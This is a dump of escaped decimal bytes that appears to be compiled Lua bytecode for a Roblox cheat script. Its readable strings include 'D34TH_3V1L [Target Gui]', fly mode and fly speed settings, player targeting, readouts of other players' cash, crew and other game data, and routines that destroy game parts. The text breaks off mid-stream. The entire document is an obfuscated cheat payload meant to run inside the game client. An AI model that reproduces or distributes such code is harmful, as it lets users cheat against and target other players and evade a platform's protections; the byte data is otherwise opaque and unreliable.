11\192\64\0\28\64\0\1\30\0\128\0\6\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\10\0\0\0\76\101\102\116\87\114\105\115\116\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\11\0\0\0\82\105\103\104\116\87\114\105\115\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\241\1\0\0\251\1\0\0\3\0\0\4\53\0\0\0\5\0\0\0\6\64\64\0\11\128\64\0\132\0\0\0\28\128\128\1\6\192\64\0\26\0\0\0\22\64\10\128\4\0\128\0\6\192\64\0\6\0\65\0\69\64\1\0\70\128\193\0\133\0\0\0\134\64\64\1\196\0\0\0\134\192\0\1\134\192\64\1\134\192\65\1\134\0\66\1\92\128\0\1\9\64\128\130\4\0\128\0\6\192\64\0\6\64\66\0\69\64\1\0\70\128\193\0\133\0\0\0\134\64\64\1\196\0\0\0\134\192\0\1\134\192\64\1\134\192\65\1\134\0\66\1\92\128\0\1\9\64\128\130\5\0\0\0\6\64\64\0\11\128\64\0\132\0\0\0\28\128\128\1\6\192\64\0\6\128\66\0\6\192\66\0\6\0\67\0\23\64\67\0\22\0\1\128\4\0\0\1\9\192\67\135\22\64\0\128\4\0\0\1\9\192\67\135\30\0\128\0\16\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\4\0\0\0\75\46\79\0\4\6\0\0\0\86\97\108\117\101\0\1\1\4\5\0\0\0\84\101\120\116\0\4\7\0\0\0\84\97\114\103\101\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\253\1\0\0\255\1\0\0\2\0\0\3\10\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\11\0\65\0\132\0\128\0\28\128\128\1\8\0\0\0\30\0\128\0\5\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\10\0\0\0\72\101\97\114\116\98\101\97\116\0\4\8\0\0\0\67\111\110\110\101\99\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2\0\0\5\2\0\0\2\0\0\4\25\0\0\0\4\0\0\0\11\0\64\0\28\64\0\1\5\64\0\0\65\128\0\0\129\192\0\0\193\0\1\0\28\64\0\2\4\0\128\0\6\64\65\0\6\128\65\0\68\0\128\0\70\64\193\0\70\0\194\0\70\192\193\0\9\64\128\131\4\0\128\0\6\64\65\0\6\64\66\0\68\0\128\0\70\64\193\0\70\128\194\0\70\192\193\0\9\64\128\131\30\0\128\0\11\0\0\0\4\11\0\0\0\68\105\115\99\111\110\110\101\99\116\0\4\9\0\0\0\97\110\110\111\117\110\99\101\0\4\7\0\0\0\84\97\114\103\101\116\0\4\20\0\0\0\110\111\32\108\111\110\103\101\114\32\116\97\114\103\101\116\105\110\103\0\3\0\0\0\0\0\0\20\64\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\7\0\0\0\67\70\114\97\109\101\0\4\13\0\0\0\76\101\102\116\76\111\119\101\114\65\114\109\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\14\0\0\0\82\105\103\104\116\76\111\119\101\114\65\114\109\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\26\2\0\0\57\2\0\0\1\0\0\10\184\0\0\0\4\0\0\0\69\0\0\0\70\64\192\0\75\128\192\0\193\192\0\0\10\193\0\0\9\65\65\130\9\193\65\131\9\65\66\132\92\64\0\2\69\128\2\0\129\192\2\0\92\64\0\1\69\128\2\0\129\0\3\0\92\64\0\1\69\128\2\0\129\64\3\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\0\196\1\1\65\4\0\149\0\1\1\92\64\0\1\69\128\2\0\129\0\3\0\92\64\0\1\69\128\4\0\133\0\0\0\139\128\67\1\1\193\3\0\156\128\128\1\134\0\0\1\134\192\68\1\139\0\69\1\156\0\0\1\92\0\1\0\22\128\2\128\139\65\197\2\1\130\5\0\156\129\128\1\154\1\0\0\22\64\1\128\133\129\2\0\193\65\3\0\6\2\196\2\65\66\3\0\213\65\130\3\156\65\0\1\97\128\0\0\22\128\252\127\69\128\2\0\129\0\3\0\92\64\0\1\69\128\2\0\129\64\3\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\0\196\1\1\193\5\0\149\0\1\1\92\64\0\1\69\128\2\0\129\0\3\0\92\64\0\1\69\128\2\0\129\0\6\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\64\198\1\149\192\0\1\92\64\0\1\69\128\2\0\129\128\6\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\198\1\198\0\199\1\198\64\199\1\149\192\0\1\92\64\0\1\69\128\2\0\129\128\7\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\198\1\198\192\199\1\198\0\200\1\198\64\199\1\149\192\0\1\92\64\0\1\69\128\2\0\129\64\8\0\197\0\0\0\198\192\195\1\198\128\200\1\198\192\200\1\198\0\201\1\198\64\201\1\198\64\199\1\149\192\0\1\92\64\0\1\69\128\2\0\129\128\9\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\200\1\198\192\201\1\198\0\202\1\149\192\0\1\92\64\0\1\69\128\2\0\129\64\10\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\200\1\198\128\202\1\198\192\202\1\149\192\0\1\92\64\0\1\69\128\2\0\129\0\11\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\198\1\198\192\199\1\198\64\203\1\198\64\199\1\149\192\0\1\92\64\0\1\69\128\2\0\129\128\11\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\198\1\198\192\199\1\198\64\203\1\198\0\196\1\149\192\0\1\92\64\0\1\69\128\2\0\129\192\11\0\197\0\0\0\203\128\195\1\65\193\3\0\220\128\128\1\198\0\128\1\198\192\200\1\198\0\204\1\198\64\204\1\198\128\204\1\149\192\0\1\92\64\0\1\69\128\2\0\129\0\3\0\92\64\0\1\30\0\128\0\51\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\24\0\0\0\68\51\52\84\72\95\51\86\49\76\32\91\84\97\114\103\101\116\32\71\117\105\93\0\4\5\0\0\0\84\101\120\116\0\4\54\0\0\0\73\110\102\111\114\109\97\116\105\111\110\32\112\114\105\110\116\101\100\32\111\110\32\116\104\101\32\99\111\110\115\111\108\101\32\112\114\101\115\115\32\70\57\32\116\111\32\115\101\101\32\105\116\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\3\0\0\0\0\0\0\36\64\4\6\0\0\0\112\114\105\110\116\0\4\12\0\0\0\68\51\52\84\72\95\51\86\49\76\32\0\4\19\0\0\0\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\0\4\1\0\0\0\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\5\0\0\0\78\97\109\101\0\4\8\0\0\0\84\111\111\108\115\58\32\0\4\6\0\0\0\112\97\105\114\115\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\15\0\0\0\71\101\116\68\101\115\99\101\110\100\97\110\116\115\0\4\4\0\0\0\73\115\65\0\4\5\0\0\0\84\111\111\108\0\4\16\0\0\0\32\124\32\73\110\102\111\114\109\97\116\105\111\110\58\0\4\10\0\0\0\85\115\101\114\32\73\68\58\32\0\4\7\0\0\0\85\115\101\114\73\100\0\4\8\0\0\0\67\97\115\104\58\32\36\0\4\11\0\0\0\68\97\116\97\70\111\108\100\101\114\0\4\9\0\0\0\67\117\114\114\101\110\99\121\0\4\6\0\0\0\86\97\108\117\101\0\4\9\0\0\0\87\97\110\116\101\100\58\32\0\4\12\0\0\0\73\110\102\111\114\109\97\116\105\111\110\0\4\7\0\0\0\87\97\110\116\101\100\0\4\18\0\0\0\83\104\111\101\115\32\67\111\108\108\101\99\116\101\100\58\32\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\13\0\0\0\83\104\111\101\115\67\111\108\108\101\99\116\0\4\17\0\0\0\83\104\105\114\116\32\84\101\109\112\108\97\116\101\58\32\0\4\6\0\0\0\83\104\105\114\116\0\4\14\0\0\0\83\104\105\114\116\84\101\109\112\108\97\116\101\0\4\17\0\0\0\80\97\110\116\115\32\84\101\109\112\108\97\116\101\58\32\0\4\6\0\0\0\80\97\110\116\115\0\4\14\0\0\0\80\97\110\116\115\84\101\109\112\108\97\116\101\0\4\10\0\0\0\67\114\101\119\32\73\68\58\32\0\4\5\0\0\0\67\114\101\119\0\4\12\0\0\0\67\114\101\119\32\78\97\109\101\58\32\0\4\11\0\0\0\83\111\117\110\100\32\73\68\58\32\0\4\11\0\0\0\76\111\119\101\114\84\111\114\115\111\0\4\13\0\0\0\66\79\79\77\66\79\88\83\79\85\78\68\0\4\8\0\0\0\83\111\117\110\100\73\100\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\217\3\0\0\223\3\0\0\0\0\0\8\19\0\0\0\5\0\0\0\69\64\0\0\70\128\192\0\70\192\192\0\70\0\193\0\75\64\193\0\92\0\0\1\28\0\1\0\22\128\1\128\75\129\65\2\193\193\1\0\92\129\128\1\90\1\0\0\22\64\0\128\75\1\66\2\92\65\0\1\33\128\0\0\22\128\253\127\30\0\128\0\9\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\71\101\116\68\101\115\99\101\110\100\97\110\116\115\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\66\97\115\101\80\97\114\116\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\94\5\0\0\98\5\0\0\1\0\0\3\6\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\30\0\128\0\3\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\100\5\0\0\116\5\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\106\5\0\0\115\5\0\0\0\0\0\7\19\0\0\0\5\0\0\0\13\64\64\0\7\0\0\0\5\128\0\0\6\192\64\0\11\0\65\0\129\64\1\0\202\192\0\0\201\192\65\131\1\65\2\0\69\129\2\0\133\1\0\0\92\129\0\1\129\193\2\0\21\129\1\2\201\0\1\132\201\64\64\134\28\64\0\2\30\0\128\0\13\0\0\0\4\9\0\0\0\70\76\89\83\80\69\69\68\0\3\0\0\0\0\0\0\240\63\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\1\0\0\0\0\4\5\0\0\0\84\101\120\116\0\4\17\0\0\0\32\91\45\93\32\70\108\121\32\83\112\101\101\100\58\32\0\4\9\0\0\0\116\111\115\116\114\105\110\103\0\4\2\0\0\0\46\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\118\5\0\0\56\6\0\0\1\0\0\5\16\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\129\64\1\0\135\0\1\0\129\192\1\0\135\128\1\0\134\0\194\0\139\64\66\1\36\1\0\0\4\0\0\0\156\64\128\1\30\0\128\0\10\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\8\0\0\0\70\76\89\77\79\68\69\0\4\3\0\0\0\73\89\0\4\9\0\0\0\70\76\89\83\80\69\69\68\0\3\0\0\0\0\0\0\57\64\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\125\5\0\0\55\6\0\0\1\0\0\13\165\0\0\0\5\0\0\0\23\64\64\0\22\64\19\128\5\128\0\0\6\192\64\0\6\0\65\0\69\64\1\0\70\128\193\0\75\192\193\0\193\0\2\0\92\128\128\1\133\64\1\0\139\64\66\1\156\128\0\1\7\128\2\0\197\192\2\0\203\0\195\1\65\65\3\0\220\128\128\1\218\0\0\0\22\192\0\128\197\192\2\0\198\64\195\1\203\128\195\1\220\64\0\1\197\192\3\0\198\0\196\1\1\65\4\0\220\128\0\1\201\64\67\137\5\1\5\0\6\1\68\2\65\65\5\0\129\65\5\0\193\65\5\0\28\129\0\2\201\0\129\137\5\129\5\0\100\1\0\0\0\0\128\1\28\65\0\1\5\193\2\0\11\193\69\2\129\65\3\0\28\65\128\1\5\193\2\0\6\65\67\2\66\1\128\0\71\1\6\0\69\65\6\0\138\1\1\0\137\193\70\141\137\193\70\142\137\193\198\142\137\193\70\143\195\1\0\4\100\66\0\0\0\0\0\2\0\0\128\0\0\0\0\3\0\0\128\2\134\194\71\1\139\2\72\5\36\131\0\0\0\0\0\2\0\0\128\3\0\0\0\4\0\0\0\3\0\0\128\4\156\130\128\1\192\1\0\5\134\66\72\1\139\2\72\5\36\195\0\0\0\0\0\3\156\130\128\1\0\2\0\5\128\2\128\4\156\66\128\0\35\0\0\0\22\128\20\128\5\128\8\0\28\64\128\0\5\128\0\0\6\192\64\0\6\0\65\0\26\0\0\0\22\0\254\127\5\128\0\0\6\192\64\0\6\0\65\0\6\128\65\0\26\0\0\0\22\128\252\127\5\128\0\0\6\192\64\0\6\0\65\0\6\128\65\0\11\192\72\0\129\0\9\0\28\128\128\1\26\0\0\0\22\64\250\127\5\128\0\0\6\192\64\0\6\0\65\0\6\128\65\0\11\192\65\0\129\0\2\0\28\128\128\1\26\0\0\0\22\0\248\127\5\128\0\0\6\192\64\0\6\0\65\0\11\64\66\0\28\128\0\1\69\128\8\0\92\64\128\0\26\0\0\0\22\192\254\127\69\128\0\0\70\192\192\0\70\0\193\0\134\128\193\0\134\0\73\1\194\0\0\0\2\1\128\0\74\1\1\0\73\129\201\146\73\129\201\147\73\129\73\148\73\129\201\148\138\1\1\0\137\129\201\146\137\129\201\147\137\129\73\148\137\129\201\148\193\129\10\0\1\130\10\0\100\2\1\0\0\0\0\1\0\0\128\0\0\0\128\2\0\0\0\4\0\0\128\3\0\0\0\3\0\0\128\1\72\2\0\0\70\194\71\0\75\2\200\4\228\66\1\0\0\0\128\1\4\0\0\0\0\0\128\2\92\66\128\1\70\66\72\0\75\2\200\4\228\130\1\0\0\0\128\2\92\66\128\1\68\2\0\0\92\66\128\0\35\0\0\0\30\0\128\0\43\0\0\0\4\8\0\0\0\70\76\89\77\79\68\69\0\4\8\0\0\0\68\101\102\97\117\108\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\4\0\0\0\112\108\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\12\0\0\0\108\111\99\97\108\112\108\97\121\101\114\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\5\0\0\0\67\111\114\101\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\80\97\114\116\0\4\5\0\0\0\78\97\109\101\0\4\5\0\0\0\83\105\122\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\154\153\153\153\153\153\169\63\4\6\0\0\0\115\112\97\119\110\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\7\0\0\0\102\108\121\105\110\103\0\4\9\0\0\0\70\76\89\83\80\69\69\68\0\4\2\0\0\0\97\0\1\0\4\2\0\0\0\100\0\4\2\0\0\0\119\0\4\2\0\0\0\115\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\6\0\0\0\75\101\121\85\112\0\4\5\0\0\0\119\97\105\116\0\4\15\0\0\0\102\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\5\0\0\0\72\101\97\100\0\4\2\0\0\0\102\0\3\0\0\0\0\0\0\0\0\4\2\0\0\0\98\0\4\2\0\0\0\108\0\4\2\0\0\0\114\0\3\0\0\0\0\0\136\179\64\7\0\0\0\0\0\0\0\137\5\0\0\143\5\0\0\1\0\0\5\22\0\0\0\4\0\0\0\69\64\0\0\9\64\0\128\5\128\0\0\6\192\64\0\65\0\1\0\132\0\0\0\28\128\128\1\68\0\0\0\9\64\128\130\69\192\1\0\70\0\194\0\70\64\194\0\9\64\0\131\69\192\2\0\70\192\192\0\129\0\3\0\193\0\3\0\1\1\3\0\92\128\0\2\9\64\0\133\30\0\128\0\13\0\0\0\4\7\0\0\0\80\97\114\101\110\116\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\87\101\108\100\0\4\6\0\0\0\80\97\114\116\48\0\4\6\0\0\0\80\97\114\116\49\0\4\12\0\0\0\108\111\99\97\108\112\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\11\0\0\0\76\111\119\101\114\84\111\114\115\111\0\4\3\0\0\0\67\48\0\4\7\0\0\0\67\70\114\97\109\101\0\3\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\151\5\0\0\199\5\0\0\4\0\0\8\184\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\69\0\0\0\70\64\192\0\129\192\0\0\196\0\0\0\92\128\128\1\9\64\65\130\133\192\1\0\134\64\64\1\197\0\2\0\198\64\194\1\5\1\2\0\6\65\66\2\69\1\2\0\70\65\194\2\156\128\0\2\9\128\0\131\132\0\0\0\134\192\66\1\9\128\0\133\133\192\1\0\134\64\64\1\193\64\3\0\1\65\3\0\65\65\3\0\156\128\0\2\73\128\0\134\132\0\0\0\134\192\67\1\73\128\0\135\133\0\4\0\156\64\128\0\132\0\128\0\137\128\196\136\134\128\195\0\198\128\195\0\198\192\196\1\141\192\0\1\198\128\66\0\140\192\0\1\196\0\0\1\198\0\197\1\218\64\0\0\22\64\3\128\196\0\0\1\198\64\197\1\218\64\0\0\22\64\2\128\196\0\0\1\198\128\197\1\218\64\0\0\22\64\1\128\196\0\0\1\198\192\197\1\218\64\0\0\22\64\0\128\197\0\6\0\200\0\128\1\196\0\0\1\198\0\197\1\218\0\0\0\22\0\2\128\197\64\6\0\198\128\198\1\198\192\198\1\198\0\199\1\4\1\128\1\206\0\129\1\140\192\0\1\196\0\128\1\200\0\128\1\196\0\0\1\198\64\197\1\218\0\0\0\22\0\2\128\197\64\6\0\198\128\198\1\198\192\198\1\198\0\199\1\4\1\128\1\206\0\129\1\141\192\0\1\196\0\128\1\200\0\128\1\196\0\0\1\198\192\197\1\218\0\0\0\22\0\2\128\197\192\3\0\198\64\192\1\4\1\128\1\65\65\7\0\129\65\7\0\220\128\0\2\142\192\0\1\196\0\128\1\200\0\128\1\196\0\0\1\198\128\197\1\218\0\0\0\22\64\2\128\197\192\3\0\198\64\192\1\4\1\128\1\18\1\0\2\65\65\7\0\129\65\7\0\220\128\0\2\142\192\0\1\196\0\128\1\200\0\128\1\196\0\128\1\5\1\6\0\24\192\0\2\22\64\0\128\197\0\6\0\200\0\128\1\198\192\68\1\9\192\0\133\196\0\0\1\198\0\197\1\218\0\0\0\22\192\3\128\197\64\6\0\198\128\198\1\198\192\198\1\5\193\3\0\6\129\71\2\69\1\2\0\70\193\199\2\132\1\128\1\92\129\0\1\82\1\128\2\129\65\7\0\193\65\7\0\28\129\0\2\206\0\129\1\73\192\0\135\22\128\5\128\196\0\0\1\198\64\197\1\218\0\0\0\22\128\3\128\197\64\6\0\198\128\198\1\198\192\198\1\5\193\3\0\6\129\71\2\69\1\2\0\70\193\199\2\132\1\128\1\92\129\0\1\129\65\7\0\193\65\7\0\28\129\0\2\206\0\129\1\73\192\0\135\22\192\0\128\197\64\6\0\198\128\198\1\198\192\198\1\73\192\0\135\197\0\8\0\23\64\200\1\22\0\222\127\90\0\0\0\22\64\0\128\139\128\200\0\156\64\0\1\26\0\0\0\22\64\0\128\139\128\72\0\156\64\0\1\130\0\0\0\135\0\8\0\132\0\128\0\137\64\200\136\133\0\6\0\136\0\128\1\30\0\128\0\35\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\13\0\0\0\66\111\100\121\80\111\115\105\116\105\111\110\0\4\9\0\0\0\66\111\100\121\71\121\114\111\0\4\5\0\0\0\78\97\109\101\0\4\8\0\0\0\69\80\73\88\80\79\83\0\4\9\0\0\0\109\97\120\70\111\114\99\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\9\0\0\0\112\111\115\105\116\105\111\110\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\109\97\120\84\111\114\113\117\101\0\3\0\192\208\211\53\165\74\67\4\7\0\0\0\99\102\114\97\109\101\0\4\7\0\0\0\67\70\114\97\109\101\0\4\5\0\0\0\119\97\105\116\0\4\14\0\0\0\80\108\97\116\102\111\114\109\83\116\97\110\100\0\1\1\4\2\0\0\0\112\0\4\2\0\0\0\119\0\4\2\0\0\0\115\0\4\2\0\0\0\97\0\4\2\0\0\0\100\0\4\9\0\0\0\70\76\89\83\80\69\69\68\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\14\0\0\0\67\117\114\114\101\110\116\67\97\109\101\114\97\0\4\16\0\0\0\67\111\111\114\100\105\110\97\116\101\70\114\97\109\101\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\3\0\0\0\0\0\0\0\0\4\7\0\0\0\65\110\103\108\101\115\0\4\4\0\0\0\114\97\100\0\4\7\0\0\0\102\108\121\105\110\103\0\1\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\200\5\0\0\218\5\0\0\5\1\0\3\49\0\0\0\68\0\0\0\90\0\0\0\22\192\0\128\68\0\0\0\70\0\192\0\90\64\0\0\22\0\2\128\66\0\0\0\71\64\0\0\68\0\128\0\75\128\192\0\92\64\0\1\68\0\0\1\75\128\192\0\92\64\0\1\30\0\128\0\23\192\64\0\22\128\0\128\68\0\128\1\73\0\193\129\22\128\6\128\23\64\65\0\22\128\0\128\68\0\128\1\73\0\193\130\22\64\5\128\23\128\65\0\22\128\0\128\68\0\128\1\73\0\65\131\22\0\4\128\23\192\65\0\22\128\0\128\68\0\128\1\73\0\193\131\22\192\2\128\23\0\66\0\22\64\2\128\69\64\0\0\23\0\193\0\22\128\0\128\66\0\0\0\71\64\0\0\22\192\0\128\66\0\128\0\71\64\0\0\68\0\0\2\92\64\128\0\30\0\128\0\9\0\0\0\4\7\0\0\0\80\97\114\101\110\116\0\4\7\0\0\0\102\108\121\105\110\103\0\4\11\0\0\0\100\105\115\99\111\110\110\101\99\116\0\4\2\0\0\0\119\0\1\1\4\2\0\0\0\115\0\4\2\0\0\0\97\0\4\2\0\0\0\100\0\4\2\0\0\0\120\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\219\5\0\0\229\5\0\0\1\1\0\2\20\0\0\0\23\0\64\0\22\128\0\128\68\0\0\0\73\64\64\128\22\64\3\128\23\128\64\0\22\128\0\128\68\0\0\0\73\64\64\129\22\0\2\128\23\192\64\0\22\128\0\128\68\0\0\0\73\64\192\129\22\192\0\128\23\0\65\0\22\64\0\128\68\0\0\0\73\64\64\130\30\0\128\0\5\0\0\0\4\2\0\0\0\119\0\1\0\4\2\0\0\0\115\0\4\2\0\0\0\97\0\4\2\0\0\0\100\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\243\5\0\0\24\6\0\0\7\0\0\8\31\1\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\9\0\193\129\69\128\1\0\70\64\192\0\129\192\1\0\193\192\1\0\1\193\1\0\92\128\0\2\9\64\128\130\68\0\0\0\70\64\194\0\9\64\0\132\69\0\0\0\70\64\192\0\129\128\2\0\196\0\0\0\92\128\128\1\133\128\1\0\134\64\64\1\193\0\3\0\1\65\3\0\65\1\3\0\156\128\0\2\73\128\128\133\133\128\1\0\134\64\64\1\193\192\1\0\1\193\1\0\65\193\1\0\156\128\0\2\73\128\0\135\133\192\3\0\156\64\128\0\132\0\128\0\134\0\68\1\139\64\68\1\1\129\4\0\156\128\128\1\137\0\197\137\132\0\0\1\134\64\69\1\196\0\0\1\198\128\197\1\140\192\0\1\23\192\69\1\22\128\1\128\132\0\0\1\134\0\70\1\196\0\0\1\198\64\198\1\140\192\0\1\87\128\70\1\22\64\3\128\132\0\128\1\140\0\67\1\196\0\128\1\4\1\0\2\207\0\129\1\140\192\0\1\136\0\128\1\132\0\128\1\196\0\0\2\24\128\128\1\22\192\6\128\132\0\0\2\136\0\128\1\22\0\6\128\132\0\0\1\134\64\69\1\196\0\0\1\198\128\197\1\140\192\0\1\23\192\70\1\22\64\4\128\132\0\0\1\134\0\70\1\196\0\0\1\198\64\198\1\140\192\0\1\23\192\70\1\22\128\2\128\132\0\128\1\87\192\70\1\22\192\1\128\132\0\128\1\141\192\70\1\136\0\128\1\132\0\128\1\24\128\128\141\22\64\0\128\129\0\7\0\136\0\128\1\132\0\0\1\134\64\69\1\196\0\0\1\198\128\197\1\140\192\0\1\23\192\70\1\22\128\1\128\132\0\0\1\134\0\70\1\196\0\0\1\198\64\198\1\140\192\0\1\87\192\70\1\22\0\14\128\133\64\7\0\134\128\71\1\134\192\71\1\134\0\72\1\134\64\72\1\196\0\0\1\198\0\198\1\4\1\0\1\6\65\70\2\204\0\129\1\142\192\0\1\197\64\7\0\198\128\199\1\198\192\199\1\198\0\200\1\5\65\2\0\6\65\64\2\68\1\0\1\70\65\197\2\132\1\0\1\134\129\69\3\76\129\129\2\132\1\0\1\134\1\70\3\196\1\0\1\198\65\198\3\140\193\1\3\142\129\72\3\193\1\3\0\28\129\0\2\6\193\72\2\206\0\129\1\5\65\7\0\6\129\71\2\6\193\71\2\6\1\72\2\6\193\72\2\205\0\129\1\140\192\0\1\196\0\128\1\142\192\0\1\73\128\128\133\138\0\1\0\196\0\0\1\198\0\198\1\137\192\0\140\196\0\0\1\198\64\198\1\137\192\128\140\196\0\0\1\198\64\197\1\137\192\128\138\196\0\0\1\198\128\197\1\137\192\0\139\136\0\128\2\22\128\16\128\132\0\0\1\134\64\69\1\196\0\0\1\198\128\197\1\140\192\0\1\23\192\70\1\22\0\13\128\132\0\0\1\134\0\